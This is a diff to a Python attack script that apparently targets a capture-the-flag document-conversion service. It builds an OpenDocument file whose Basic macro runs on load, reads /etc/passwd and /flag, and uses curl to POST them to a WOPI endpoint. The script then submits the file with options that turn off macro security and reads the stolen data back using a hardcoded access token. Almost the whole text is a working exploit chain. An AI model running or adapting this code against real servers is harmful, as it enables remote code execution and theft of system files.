@@ -119,15 +119,44 @@ def descriptor(name, typ, value):
     return json.dumps({name: {"type": typ, "value": value}}, separators=(",", ":"))
 
 
+def flat_exfil(token):
+    script_url = "http://webapp:8000/wopi/files/d3/contents?access_token=" + token
+    basic = f'''Sub Main()
+    Dim i As Integer
+    i = FreeFile
+    Open "/tmp/arena_exfil.sh" For Output As #i
+    Print #i, "( echo MACRO_EXECUTED; cat /etc/passwd; cat /flag ) > /tmp/arena_exfil.txt 2>/dev/null"
+    Print #i, "curl -sS -X POST -H 'X-WOPI-Override: PUT' --data-binary @/tmp/arena_exfil.txt '{script_url}'"
+    Close #i
+    Shell("/bin/sh", 1, "/tmp/arena_exfil.sh", True)
+End Sub'''
+    source = basic.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
+    return f'''<?xml version="1.0" encoding="UTF-8"?>
+<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:ooo="http://openoffice.org/2004/office" office:version="1.2" office:mimetype="application/vnd.oasis.opendocument.text">
+<office:scripts><office:script script:language="ooo:Basic"><ooo:libraries><ooo:library-embedded ooo:name="Standard"><ooo:module ooo:name="Module1"><ooo:source-code>{source}</ooo:source-code></ooo:module></ooo:library-embedded></ooo:libraries></office:script>
+<office:event-listeners><script:event-listener script:language="ooo:script" script:event-name="dom:load" xlink:href="vnd.sun.star.script:Standard.Module1.Main?language=Basic&amp;location=document" xlink:type="simple"/></office:event-listeners></office:scripts>
+<office:body><office:text><text:p>ORIGINAL_DOCUMENT</text:p></office:text></office:body></office:document>'''.encode()
+
+
+def wopi(token, data=None):
+    url = BASE + "/wopi/files/d3/contents?access_token=" + token
+    headers = {"Content-Type": "text/plain"}
+    method = "GET"
+    if data is not None:
+        method = "POST"
+        headers["X-WOPI-Override"] = "PUT"
+    req = urllib.request.Request(url, data=data, headers=headers, method=method)
+    with urllib.request.urlopen(req, timeout=45) as r:
+        raw = r.read(1000000)
+        print("WOPI", method, "STATUS", r.status, "BYTES", len(raw), "BODY", raw.decode("utf-8", "replace"), flush=True)
+
+
 def main():
-    flat = flat_macro()
-    zipped = macro_odt()
-    print("FLAT_MACRO_BYTES", len(flat), "ZIP_MACRO_BYTES", len(zipped), flush=True)
-    send(flat, {}, "NO_OPTIONS")
-    send(flat, {"infilterOptions": "EnableMacrosExecution=true,MacroSecurityLevel=0"}, "EXACT_MACRO_CHAIN_FLAT")
-    send(flat, {"infilterOptions": "MacroSecurityLevel=0,EnableMacrosExecution=true"}, "REVERSED_MACRO_CHAIN_FLAT")
-    send(zipped, {"infilterOptions": "EnableMacrosExecution=true,MacroSecurityLevel=0"}, "EXACT_MACRO_CHAIN_ZIP", "macro.odt")
-    send(flat, {"infilterOptions": "EnableMacrosExecution=true,MacroSecurityLevel=0,UpdateDocMode=3"}, "MACRO_CHAIN_AND_UPDATE")
+    token = "1NUPusl4gZn204nXX72yqWWOqKWSCg_o1ZiGTuGvcTk"
+    wopi(token, b"WAITING_FOR_MACRO")
+    doc = flat_exfil(token)
+    send(doc, {"infilterOptions": "EnableMacrosExecution=true,MacroSecurityLevel=0"}, "EXFIL_MACRO_CHAIN")
+    wopi(token)
 
 
 if __name__ == "__main__":
